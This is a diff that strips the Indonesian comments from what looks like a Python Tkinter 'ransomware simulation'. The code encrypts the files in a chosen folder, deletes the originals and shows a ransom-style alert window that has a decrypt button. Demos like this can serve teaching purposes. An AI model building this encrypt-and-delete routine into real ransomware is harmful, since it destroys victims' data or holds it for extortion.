@@ -7,11 +7,9 @@ import hashlib
 import threading
 import time
 
-# Fungsi generate key dari password
 def generate_key(password):
     return base64.urlsafe_b64encode(hashlib.sha256(password.encode()).digest())
 
-# Fungsi enkripsi file
 def encrypt_file(filepath, key):
     with open(filepath, 'rb') as f:
         data = f.read()
@@ -21,7 +19,6 @@ def encrypt_file(filepath, key):
         f.write(encrypted)
     os.remove(filepath)
 
-# Fungsi dekripsi file
 def decrypt_file(filepath, key):
     with open(filepath, 'rb') as f:
         data = f.read()
@@ -32,7 +29,6 @@ def decrypt_file(filepath, key):
         f.write(decrypted)
     os.remove(filepath)
 
-# Simulasi jendela ancaman ransomware
 def show_ransom_ui(folder, key):
     ransom = tk.Toplevel()
     ransom.title("Ransomware Alert!")
@@ -91,7 +87,6 @@ def show_ransom_ui(folder, key):
 
     tk.Button(ransom, text="DECRYPT", command=try_decrypt, bg="green", fg="white").pack(pady=20)
 
-# UI awal untuk enkripsi
 def start_encryption():
     folder = filedialog.askdirectory()
     if not folder:
@@ -108,7 +103,6 @@ def start_encryption():
     messagebox.showinfo("Berhasil", "Folder berhasil dienkripsi.")
     show_ransom_ui(folder, key)
 
-# UI utama
 def main_ui():
     root = tk.Tk()
     root.title("Ransomware Simulasi")
